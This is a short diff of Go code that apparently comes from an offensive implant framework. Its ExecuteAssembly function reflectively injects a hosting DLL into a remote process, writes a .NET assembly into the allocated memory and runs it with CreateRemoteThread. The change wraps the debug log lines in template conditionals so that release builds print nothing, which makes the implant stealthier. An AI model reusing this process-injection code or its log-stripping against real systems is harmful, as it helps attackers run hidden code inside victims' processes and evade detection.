@@ -169,7 +169,9 @@ func ExecuteAssembly(hostingDll, assembly []byte, params string) (string, error)
 	if err != nil {
 		return "", err
 	}
+	// {{if .Debug}}
 	log.Printf("[*] Hosting DLL reflectively injected at 0x%08x\n", hostingDllAddr)
+	// {{end}}
 	// Total size to allocate = assembly size + 1024 bytes for the args
 	totalSize := uint32(MAX_ASSEMBLY_LENGTH)
 	// VirtualAllocEx to allocate another memory segment for hosting the .NET assembly and args
@@ -188,7 +190,9 @@ func ExecuteAssembly(hostingDll, assembly []byte, params string) (string, error)
 	if err != nil {
 		return "", err
 	}
+	// {{if .Debug}}
 	log.Printf("[*] Wrote %d bytes at 0x%08x\n", len(final), assemblyAddr)
+	// {{end}}
 	// CreateRemoteThread(DLL addr + offset, assembly addr)
 	attr := new(syscall.SecurityAttributes)
 	_, _, err = createRemoteThread(handle, attr, 0, uintptr(hostingDllAddr+BobLoaderOffset), uintptr(assemblyAddr), 0)
@@ -202,7 +206,9 @@ func ExecuteAssembly(hostingDll, assembly []byte, params string) (string, error)
 	_, errStderr = io.Copy(&stderrBuf, stderrIn)
 
 	if errStdout != nil || errStderr != nil {
+		// {{if .Debug}}
 		log.Fatal("failed to capture stdout or stderr\n")
+		// {{end}}
 	}
 	outStr, errStr := string(stdoutBuf.Bytes()), string(stderrBuf.Bytes())
 	if len(errStr) > 1 {
